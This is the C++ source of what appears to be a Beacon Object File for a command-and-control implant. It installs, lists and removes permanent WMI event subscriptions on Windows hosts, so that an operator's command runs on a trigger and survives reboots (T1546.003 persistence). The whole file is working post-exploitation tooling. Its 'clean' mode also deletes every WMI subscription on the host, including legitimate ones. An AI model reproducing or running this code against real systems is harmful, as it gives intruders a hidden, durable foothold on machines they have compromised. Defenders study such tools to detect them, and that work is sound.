/*
 * WmiSubscriptions BOF — WMI Event Subscription persistence (T1546.003).
 *
 * Creates / lists / removes *permanent* WMI event subscriptions on the
 * local host via COM + WMI (root\subscription namespace). Unlike the
 * Jump-exec EventSub BOF (which uses a throwaway ActiveScript consumer
 * for lateral movement), this module installs a
 * CommandLineEventConsumer + __EventFilter + __FilterToConsumerBinding
 * triple that persists across reboots and fires the operator's command
 * whenever the trigger fires.
 *
 * Modes (dispatched by wmisubscriptions.py):
 *   0 = list   — enumerate every subscription component
 *   1 = create — name, commandline, query, timerId, intervalMs
 *   2 = remove — name, timerId (deletes filter+consumer+binding+timer)
 *   3 = clean  — delete every subscription component found
 *
 * All strings are UTF-16LE on the wire (Python `addWstr`), so they arrive
 * here already as wchar_t*. BeaconDataExtract returns the raw bytes.
 *
 * OUTPUT CONTRACT: every message is buffered via bprintf() and flushed in
 * ONE BeaconOutput(CALLBACK_OUTPUT, ...) at the end of go(). This is the
 * same internal_printf/printoutput(TRUE) pattern the C BOFs (Copy, GhostTask,
 * ScSdshow) use — it makes the demon deliver a single output chunk instead
 * of one chunk per line.
 */

#include <objbase.h>
#include <windows.h>
#include <oleauto.h>
#include <wbemcli.h>
#include <combaseapi.h>
#include <stdarg.h>

extern "C" {

#include "beacon.h"

    void go(char* buff, int len);

    /* OLE32 / COM */
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CLSIDFromString(wchar_t* lpsz, LPCLSID pclsid);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$IIDFromString(wchar_t* lpsz, LPIID lpiid);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
    DECLSPEC_IMPORT VOID    WINAPI OLE32$CoUninitialize();
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);

    /* OLEAUT32 */
    DECLSPEC_IMPORT VOID    WINAPI OLEAUT32$VariantInit(VARIANTARG* pvarg);
    DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG* pvarg);
    DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR* psz);
    DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR bstrString);

    /* KERNEL32 */
    DECLSPEC_IMPORT void*   WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
    DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap();
    DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
    DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT CodePage, DWORD dwFlags, const wchar_t* lpWideCharStr, int cchWideChar, char* lpMultiByteStr, int cbMultiByte, const char* lpDefaultChar, BOOL* lpUsedDefaultChar);

    /* MSVCRT (DFR symbols provided by the demon loader) */
    DECLSPEC_IMPORT int   __cdecl MSVCRT$vsnprintf(char* d, size_t n, const char* format, va_list arg);
    DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void* d, const void* s, size_t n);
}

#define HEAP_ALLOC(sz) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (sz))
#define HEAP_FREE(p)   KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

#define OUTBUFSIZE 8192

/* Global output buffer. Initialized to non-zero sentinels so the globals
   land in .data rather than .bss (the BOF loader does not zero .bss — the
   same reason base.c uses `char * output = (char*)1`). go() allocates the
   real buffer and resets the length before the first bprintf(). */
static char* g_out    = (char*)1;
static int   g_outLen = 1;

/* Emit the accumulated output as ONE chunk. */
static void bflush(void)
{
    if (g_out != NULL && g_out != (char*)1 && g_outLen > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_out, g_outLen);
    g_outLen = 0;
    if (g_out != NULL && g_out != (char*)1)
        g_out[0] = '\0';
}

/* Buffer a formatted line. If it would overflow the 8 KiB buffer, flush the
   accumulated output first (same behavior as base.c's internal_printf). */
static void bprintf(const char* fmt, ...)
{
    va_list ap;
    int     n;
    char*   tmp;
    int     remaining, toCopy;

    if (g_out == NULL || g_out == (char*)1)
        return;

    va_start(ap, fmt);
    n = MSVCRT$vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);
    if (n <= 0)
        return;

    tmp = (char*)HEAP_ALLOC((size_t)n + 1);
    if (!tmp)
        return;

    va_start(ap, fmt);
    MSVCRT$vsnprintf(tmp, (size_t)n + 1, fmt, ap);
    va_end(ap);

    if (g_outLen + n >= OUTBUFSIZE)
        bflush();

    remaining = OUTBUFSIZE - g_outLen - 1;
    toCopy    = (n < remaining) ? n : remaining;
    MSVCRT$memcpy(g_out + g_outLen, tmp, (size_t)toCopy);
    g_outLen += toCopy;
    g_out[g_outLen] = '\0';

    HEAP_FREE(tmp);
}

/* ---- wide-string helpers (avoid MSVCRT routing surprises) ---- */

static size_t wlen(const wchar_t* s)
{
    size_t n = 0;
    if (s) while (s[n]) n++;
    return n;
}

static void wcpy(wchar_t* d, const wchar_t* s)
{
    while ((*d++ = *s++)) ;
}

static void wcat_s(wchar_t* d, const wchar_t* s)
{
    d += wlen(d);
    wcpy(d, s);
}

/* Extract the first whitespace-delimited token of a command line (the
   executable), honoring a leading double-quoted path. Caller HEAP_FREEs. */
static wchar_t* FirstToken(const wchar_t* s)
{
    const wchar_t* p;
    wchar_t* out;
    size_t n, i;

    if (!s)
        return NULL;
    p = s;
    while (*p == L' ' || *p == L'\t' || *p == L'\r' || *p == L'\n')
        p++;

    if (*p == L'"')
    {
        p++;
        n = 0;
        while (p[n] && p[n] != L'"')
            n++;
        out = (wchar_t*)HEAP_ALLOC((n + 1) * sizeof(wchar_t));
        if (!out)
            return NULL;
        for (i = 0; i < n; i++)
            out[i] = p[i];
        out[n] = L'\0';
        return out;
    }

    n = 0;
    while (p[n] && p[n] != L' ' && p[n] != L'\t')
        n++;
    out = (wchar_t*)HEAP_ALLOC((n + 1) * sizeof(wchar_t));
    if (!out)
        return NULL;
    for (i = 0; i < n; i++)
        out[i] = p[i];
    out[n] = L'\0';
    return out;
}

/* Convert UTF-16 -> UTF-8 into a heap buffer (caller HEAP_FREEs). */
static char* wtoa(const wchar_t* w)
{
    int n;
    char* out;
    if (!w) return NULL;
    n = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, w, -1, NULL, 0, NULL, NULL);
    if (n <= 0) return NULL;
    out = (char*)HEAP_ALLOC((size_t)n);
    if (!out) return NULL;
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, w, -1, out, n, NULL, NULL);
    return out;
}

/* ---- WMI BSTR helpers ----
 *
 * Every IWbemServices method that takes a path/query/language string takes a
 * *BSTR*, not a plain wchar_t*. A BSTR is a SysAllocString allocation with a
 * 4-byte length prefix immediately before the string data — WMI reads that
 * prefix (SysStringLen) and frees via SysFreeString. Passing a raw wchar_t*
 * (stack buffer or BeaconDataExtract pointer) makes WMI read garbage as the
 * length and/or free a non-BSTR pointer -> access violation. These helpers
 * wrap the WMI calls so every string is a proper BSTR for the duration of
 * the call. */

static HRESULT WmiGetClass(IWbemServices* psvc, const wchar_t* className, IWbemClassObject** out)
{
    BSTR    b  = OLEAUT32$SysAllocString(className);
    HRESULT hr;
    if (!b) return E_OUTOFMEMORY;
    hr = psvc->GetObject(b, 0, NULL, out, NULL);
    OLEAUT32$SysFreeString(b);
    return hr;
}

static HRESULT WmiExecQuery(IWbemServices* psvc, const wchar_t* query, IEnumWbemClassObject** out)
{
    BSTR    lang = OLEAUT32$SysAllocString(L"WQL");
    BSTR    q    = OLEAUT32$SysAllocString(query);
    HRESULT hr;
    if (!lang || !q)
    {
        if (lang) OLEAUT32$SysFreeString(lang);
        if (q)    OLEAUT32$SysFreeString(q);
        return E_OUTOFMEMORY;
    }
    hr = psvc->ExecQuery(lang, q, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, out);
    OLEAUT32$SysFreeString(lang);
    OLEAUT32$SysFreeString(q);
    return hr;
}

static HRESULT WmiDeleteInstance(IWbemServices* psvc, const wchar_t* path)
{
    BSTR    b  = OLEAUT32$SysAllocString(path);
    HRESULT hr;
    if (!b) return E_OUTOFMEMORY;
    hr = psvc->DeleteInstance(b, 0, NULL, NULL);
    OLEAUT32$SysFreeString(b);
    return hr;
}

/* ---- WMI instance builders ---- */

static BOOL putBstrInClass(IWbemClassObject* obj, const wchar_t* key, const wchar_t* val, CIMTYPE_ENUMERATION type)
{
    VARIANT v;
    BSTR    b;
    HRESULT hr;

    b = OLEAUT32$SysAllocString(val);
    if (!b)
        return FALSE;

    OLEAUT32$VariantInit(&v);
    v.vt      = VT_BSTR;
    v.bstrVal = b;
    hr = obj->Put(key, 0, &v, type);
    OLEAUT32$VariantClear(&v);   /* frees b (SysFreeString) */
    return SUCCEEDED(hr);
}

static BOOL putUInt32InClass(IWbemClassObject* obj, const wchar_t* key, UINT32 val)
{
    VARIANT v;
    HRESULT hr;
    OLEAUT32$VariantInit(&v);
    v.vt = VT_I4;
    v.lVal = (LONG)val;
    hr = obj->Put(key, 0, &v, CIM_UINT32);
    OLEAUT32$VariantClear(&v);
    return SUCCEEDED(hr);
}

/* Object reference paths (PutInstance property values):
     __EventFilter.Name="name"
     CommandLineEventConsumer.Name="name"                         */
static void BuildFilterRef(wchar_t* out, const wchar_t* name)
{
    wcpy(out, L"__EventFilter.Name=\"");
    wcat_s(out, name);
    wcat_s(out, L"\"");
}

static void BuildConsumerRef(wchar_t* out, const wchar_t* name)
{
    wcpy(out, L"CommandLineEventConsumer.Name=\"");
    wcat_s(out, name);
    wcat_s(out, L"\"");
}

/* __IntervalTimerInstruction.TimerId="timerId" */
static void BuildTimerRef(wchar_t* out, const wchar_t* timerId)
{
    wcpy(out, L"__IntervalTimerInstruction.TimerId=\"");
    wcat_s(out, timerId);
    wcat_s(out, L"\"");
}

/* Fully-escaped binding path for DeleteInstance:
   __FilterToConsumerBinding.Consumer="CommandLineEventConsumer.Name=\"name\"",Filter="__EventFilter.Name=\"name\"" */
static void BuildBindingPath(wchar_t* out, const wchar_t* name)
{
    wcpy(out, L"__FilterToConsumerBinding.Consumer=\"CommandLineEventConsumer.Name=\\\"");
    wcat_s(out, name);
    wcat_s(out, L"\\\"\",Filter=\"__EventFilter.Name=\\\"");
    wcat_s(out, name);
    wcat_s(out, L"\\\"\"");
}

/* ---- listing ---- */

static void PrintProp(IWbemClassObject* obj, const wchar_t* prop, const char* label)
{
    VARIANT v;
    HRESULT hr;
    OLEAUT32$VariantInit(&v);
    hr = obj->Get(prop, 0, &v, NULL, NULL);
    if (SUCCEEDED(hr))
    {
        if (v.vt == VT_BSTR && v.bstrVal)
        {
            char* a = wtoa((const wchar_t*)v.bstrVal);
            bprintf("  %s: %s\n", label, a ? a : "(null)");
            if (a) HEAP_FREE(a);
        }
        else if (v.vt == VT_I4 || v.vt == VT_UI4 || v.vt == VT_I2 || v.vt == VT_UI2)
        {
            bprintf("  %s: %d\n", label, (int)v.lVal);
        }
    }
    OLEAUT32$VariantClear(&v);
}

static void ListClass(IWbemServices* psvc, const wchar_t* className)
{
    wchar_t query[256];
    IEnumWbemClassObject* en = NULL;
    IWbemClassObject* obj = NULL;
    ULONG count = 0;
    HRESULT hr;

    wcpy(query, L"SELECT * FROM ");
    wcat_s(query, className);

    hr = WmiExecQuery(psvc, query, &en);
    if (FAILED(hr) || !en)
    {
        char* cn = wtoa(className);
        bprintf("[-] ExecQuery(%s) failed: 0x%08x\n", cn ? cn : "?", (unsigned)hr);
        if (cn) HEAP_FREE(cn);
        return;
    }

    while (en->Next(WBEM_INFINITE, 1, &obj, &count) == S_OK && count == 1)
    {
        PrintProp(obj, L"__RELPATH", "PATH");
        PrintProp(obj, L"Name", "Name");
        PrintProp(obj, L"EventNamespace", "EventNS");
        PrintProp(obj, L"Query", "Query");
        PrintProp(obj, L"QueryLanguage", "QueryLang");
        PrintProp(obj, L"ExecutablePath", "ExePath");
        PrintProp(obj, L"CommandLineTemplate", "Command");
        PrintProp(obj, L"ScriptText", "Script");
        PrintProp(obj, L"TimerId", "TimerId");
        PrintProp(obj, L"IntervalBetweenEvents", "IntervalMs");
        bprintf("\n");
        obj->Release();
        obj = NULL;
    }
    en->Release();
}

static void DoList(IWbemServices* psvc)
{
    bprintf("=== WMI Event Subscriptions ===\n\n");

    bprintf("[*] __EventFilter\n");
    ListClass(psvc, L"__EventFilter");

    bprintf("[*] CommandLineEventConsumer\n");
    ListClass(psvc, L"CommandLineEventConsumer");

    bprintf("[*] ActiveScriptEventConsumer\n");
    ListClass(psvc, L"ActiveScriptEventConsumer");

    bprintf("[*] __FilterToConsumerBinding\n");
    ListClass(psvc, L"__FilterToConsumerBinding");

    bprintf("[*] __IntervalTimerInstruction\n");
    ListClass(psvc, L"__IntervalTimerInstruction");

    bprintf("\n[*] Done.\n");
}

/* ---- create ---- */

static void DoCreate(IWbemServices* psvc, const wchar_t* name, const wchar_t* cmdline,
                     const wchar_t* query, const wchar_t* timerId, int intervalMs,
                     const wchar_t* eventNamespace)
{
    IWbemClassObject* filterCls  = NULL;
    IWbemClassObject* consumCls  = NULL;
    IWbemClassObject* bindCls    = NULL;
    IWbemClassObject* timerCls   = NULL;
    IWbemClassObject* filter     = NULL;
    IWbemClassObject* consumer   = NULL;
    IWbemClassObject* binding    = NULL;
    IWbemClassObject* timer      = NULL;
    wchar_t ref[1024];
    HRESULT hr;

    hr = WmiGetClass(psvc, L"__EventFilter", &filterCls);
    if (FAILED(hr)) { bprintf("[-] GetObject(__EventFilter) failed: 0x%08x\n", (unsigned)hr); goto rip; }

    hr = WmiGetClass(psvc, L"CommandLineEventConsumer", &consumCls);
    if (FAILED(hr)) { bprintf("[-] GetObject(CommandLineEventConsumer) failed: 0x%08x\n", (unsigned)hr); goto rip; }

    hr = WmiGetClass(psvc, L"__FilterToConsumerBinding", &bindCls);
    if (FAILED(hr)) { bprintf("[-] GetObject(__FilterToConsumerBinding) failed: 0x%08x\n", (unsigned)hr); goto rip; }

    /* __EventFilter */
    hr = filterCls->SpawnInstance(0, &filter);
    if (FAILED(hr)) { bprintf("[-] SpawnInstance(__EventFilter) failed: 0x%08x\n", (unsigned)hr); goto rip; }
    putBstrInClass(filter, L"Name", name, CIM_STRING);
    putBstrInClass(filter, L"QueryLanguage", L"WQL", CIM_STRING);
    putBstrInClass(filter, L"Query", query, CIM_STRING);
    putBstrInClass(filter, L"EventNamespace", eventNamespace, CIM_STRING);
    hr = psvc->PutInstance(filter, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) { bprintf("[-] PutInstance(__EventFilter) failed: 0x%08x\n", (unsigned)hr); goto rip; }
    bprintf("[+] __EventFilter created\n");

    /* CommandLineEventConsumer */
    hr = consumCls->SpawnInstance(0, &consumer);
    if (FAILED(hr)) { bprintf("[-] SpawnInstance(CommandLineEventConsumer) failed: 0x%08x\n", (unsigned)hr); goto rip; }
    putBstrInClass(consumer, L"Name", name, CIM_STRING);
    /* ExecutablePath is the lpApplicationName passed to CreateProcess; the
       docs recommend always setting it so the module is explicit and can't
       be overridden by event parameters. CommandLineTemplate is lpCommandLine. */
    {
        wchar_t* exe = FirstToken(cmdline);
        if (exe && exe[0])
            putBstrInClass(consumer, L"ExecutablePath", exe, CIM_STRING);
        if (exe)
            HEAP_FREE(exe);
    }
    putBstrInClass(consumer, L"CommandLineTemplate", cmdline, CIM_STRING);
    hr = psvc->PutInstance(consumer, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) { bprintf("[-] PutInstance(CommandLineEventConsumer) failed: 0x%08x\n", (unsigned)hr); goto rip; }
    bprintf("[+] CommandLineEventConsumer created\n");

    /* __FilterToConsumerBinding */
    hr = bindCls->SpawnInstance(0, &binding);
    if (FAILED(hr)) { bprintf("[-] SpawnInstance(__FilterToConsumerBinding) failed: 0x%08x\n", (unsigned)hr); goto rip; }
    BuildConsumerRef(ref, name);
    putBstrInClass(binding, L"Consumer", ref, CIM_REFERENCE);
    BuildFilterRef(ref, name);
    putBstrInClass(binding, L"Filter", ref, CIM_REFERENCE);
    hr = psvc->PutInstance(binding, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) { bprintf("[-] PutInstance(__FilterToConsumerBinding) failed: 0x%08x\n", (unsigned)hr); goto rip; }
    bprintf("[+] __FilterToConsumerBinding created\n");

    /* optional __IntervalTimerInstruction (interval triggers) */
    if (timerId && timerId[0])
    {
        hr = WmiGetClass(psvc, L"__IntervalTimerInstruction", &timerCls);
        if (FAILED(hr)) { bprintf("[-] GetObject(__IntervalTimerInstruction) failed: 0x%08x\n", (unsigned)hr); goto rip; }
        hr = timerCls->SpawnInstance(0, &timer);
        if (FAILED(hr)) { bprintf("[-] SpawnInstance(__IntervalTimerInstruction) failed: 0x%08x\n", (unsigned)hr); goto rip; }
        putBstrInClass(timer, L"TimerId", timerId, CIM_STRING);
        putUInt32InClass(timer, L"IntervalBetweenEvents", (UINT32)intervalMs);
        hr = psvc->PutInstance(timer, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        if (FAILED(hr)) { bprintf("[-] PutInstance(__IntervalTimerInstruction) failed: 0x%08x\n", (unsigned)hr); goto rip; }
        bprintf("[+] __IntervalTimerInstruction created\n");
    }

    {
        char* n = wtoa(name);
        char* c = wtoa(cmdline);
        char* q = wtoa(query);
        bprintf("\n[+] Persistence subscription '%s' installed.\n", n ? n : "?");
        bprintf("    command : %s\n", c ? c : "?");
        bprintf("    query   : %s\n", q ? q : "?");
        if (n) HEAP_FREE(n);
        if (c) HEAP_FREE(c);
        if (q) HEAP_FREE(q);
    }

rip:
    if (timer)     timer->Release();
    if (binding)   binding->Release();
    if (consumer)  consumer->Release();
    if (filter)    filter->Release();
    if (timerCls)  timerCls->Release();
    if (bindCls)   bindCls->Release();
    if (consumCls) consumCls->Release();
    if (filterCls) filterCls->Release();
}

/* ---- remove (single named subscription) ---- */

static void DoRemove(IWbemServices* psvc, const wchar_t* name, const wchar_t* timerId)
{
    wchar_t path[2048];
    HRESULT hr;

    /* binding must be deleted first (else dangling references) */
    BuildBindingPath(path, name);
    hr = WmiDeleteInstance(psvc, path);
    if (SUCCEEDED(hr))
        bprintf("[+] deleted __FilterToConsumerBinding\n");
    else
        bprintf("[-] delete __FilterToConsumerBinding failed: 0x%08x\n", (unsigned)hr);

    BuildConsumerRef(path, name);
    hr = WmiDeleteInstance(psvc, path);
    if (SUCCEEDED(hr))
        bprintf("[+] deleted CommandLineEventConsumer\n");
    else
        bprintf("[-] delete CommandLineEventConsumer failed: 0x%08x\n", (unsigned)hr);

    BuildFilterRef(path, name);
    hr = WmiDeleteInstance(psvc, path);
    if (SUCCEEDED(hr))
        bprintf("[+] deleted __EventFilter\n");
    else
        bprintf("[-] delete __EventFilter failed: 0x%08x\n", (unsigned)hr);

    if (timerId && timerId[0])
    {
        BuildTimerRef(path, timerId);
        hr = WmiDeleteInstance(psvc, path);
        if (SUCCEEDED(hr))
            bprintf("[+] deleted __IntervalTimerInstruction\n");
        else
            bprintf("[-] delete __IntervalTimerInstruction failed: 0x%08x\n", (unsigned)hr);
    }
}

/* ---- clean (delete everything) ---- */

static void DeleteAllInClass(IWbemServices* psvc, const wchar_t* className)
{
    wchar_t query[256];
    IEnumWbemClassObject* en = NULL;
    IWbemClassObject* obj = NULL;
    ULONG count = 0;
    int deleted = 0;
    HRESULT hr;

    wcpy(query, L"SELECT * FROM ");
    wcat_s(query, className);

    hr = WmiExecQuery(psvc, query, &en);
    if (FAILED(hr) || !en)
        return;

    while (en->Next(WBEM_INFINITE, 1, &obj, &count) == S_OK && count == 1)
    {
        VARIANT v;
        OLEAUT32$VariantInit(&v);
        if (SUCCEEDED(obj->Get(L"__RELPATH", 0, &v, NULL, NULL)) && v.vt == VT_BSTR && v.bstrVal)
        {
            /* v.bstrVal is a real BSTR from the provider — safe to pass
               directly to DeleteInstance (VariantClear frees it after). */
            if (SUCCEEDED(psvc->DeleteInstance(v.bstrVal, 0, NULL, NULL)))
                deleted++;
        }
        OLEAUT32$VariantClear(&v);
        obj->Release();
        obj = NULL;
    }
    en->Release();

    {
        char* cn = wtoa(className);
        bprintf("[*] %s: %d deleted\n", cn ? cn : "?", deleted);
        if (cn) HEAP_FREE(cn);
    }
}

static void DoClean(IWbemServices* psvc)
{
    bprintf("[*] Removing all WMI event subscriptions...\n");

    /* bindings first */
    DeleteAllInClass(psvc, L"__FilterToConsumerBinding");
    DeleteAllInClass(psvc, L"CommandLineEventConsumer");
    DeleteAllInClass(psvc, L"ActiveScriptEventConsumer");
    DeleteAllInClass(psvc, L"__EventFilter");
    DeleteAllInClass(psvc, L"__IntervalTimerInstruction");

    bprintf("[+] Cleanup complete.\n");
}

/* ---- entrypoint ---- */

void go(char* buff, int len)
{
    datap parser;
    int mode;
    HRESULT hr;

    IWbemLocator* ploc = NULL;
    IWbemServices* psvc = NULL;

    /* Allocate + prime the output buffer BEFORE any bprintf() call. */
    g_out    = (char*)HEAP_ALLOC(OUTBUFSIZE);
    g_outLen = 0;
    if (g_out)
        g_out[0] = '\0';

    /* COM / WBEM bootstrap */
    wchar_t* Iwbmstr = (wchar_t*)L"{dc12a687-737f-11cf-884d-00aa004b2e24}";
    wchar_t* Cwbmstr = (wchar_t*)L"{4590f811-1d3a-11d0-891f-00aa004b2e24}";
    IID  Iwbm;
    CLSID Cwbm;
    OLE32$CLSIDFromString(Cwbmstr, &Cwbm);
    OLE32$IIDFromString(Iwbmstr, &Iwbm);

    BeaconDataParse(&parser, buff, len);
    mode = BeaconDataInt(&parser);

    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr))
    {
        bprintf("[-] CoInitializeEx failed: 0x%08x\n", (unsigned)hr);
        goto done;
    }

    hr = OLE32$CoCreateInstance(Cwbm, 0, CLSCTX_INPROC_SERVER, Iwbm, (LPVOID*)&ploc);
    if (FAILED(hr) || !ploc)
    {
        bprintf("[-] CoCreateInstance(WbemLocator) failed: 0x%08x\n", (unsigned)hr);
        OLE32$CoUninitialize();
        goto done;
    }

    /* connect to the LOCAL root\subscription namespace */
    {
        BSTR ns = OLEAUT32$SysAllocString(L"root\\subscription");
        if (ns)
        {
            hr = ploc->ConnectServer(ns, NULL, NULL, 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &psvc);
            OLEAUT32$SysFreeString(ns);
        }
        else
            hr = E_OUTOFMEMORY;
    }
    if (FAILED(hr) || !psvc)
    {
        bprintf("[-] ConnectServer(root\\subscription) failed: 0x%08x\n", (unsigned)hr);
        ploc->Release();
        OLE32$CoUninitialize();
        goto done;
    }

    hr = OLE32$CoSetProxyBlanket(psvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                 RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr))
    {
        bprintf("[-] CoSetProxyBlanket failed: 0x%08x\n", (unsigned)hr);
        psvc->Release();
        ploc->Release();
        OLE32$CoUninitialize();
        goto done;
    }

    switch (mode)
    {
        case 0:
            DoList(psvc);
            break;

        case 1:
        {
            wchar_t* name     = (wchar_t*)BeaconDataExtract(&parser, NULL);
            wchar_t* cmdline  = (wchar_t*)BeaconDataExtract(&parser, NULL);
            wchar_t* query    = (wchar_t*)BeaconDataExtract(&parser, NULL);
            wchar_t* timerId  = (wchar_t*)BeaconDataExtract(&parser, NULL);
            int      interval = BeaconDataInt(&parser);
            wchar_t* ns       = (wchar_t*)BeaconDataExtract(&parser, NULL);
            DoCreate(psvc, name, cmdline, query, timerId, interval, ns);
            break;
        }

        case 2:
        {
            wchar_t* name    = (wchar_t*)BeaconDataExtract(&parser, NULL);
            wchar_t* timerId = (wchar_t*)BeaconDataExtract(&parser, NULL);
            DoRemove(psvc, name, timerId);
            break;
        }

        case 3:
            DoClean(psvc);
            break;

        default:
            bprintf("[-] Unknown mode: %d\n", mode);
            break;
    }

    psvc->Release();
    ploc->Release();
    OLE32$CoUninitialize();

done:
    /* single output chunk */
    bflush();
    if (g_out && g_out != (char*)1)
        HEAP_FREE(g_out);
    g_out    = (char*)1;
    g_outLen = 1;
}
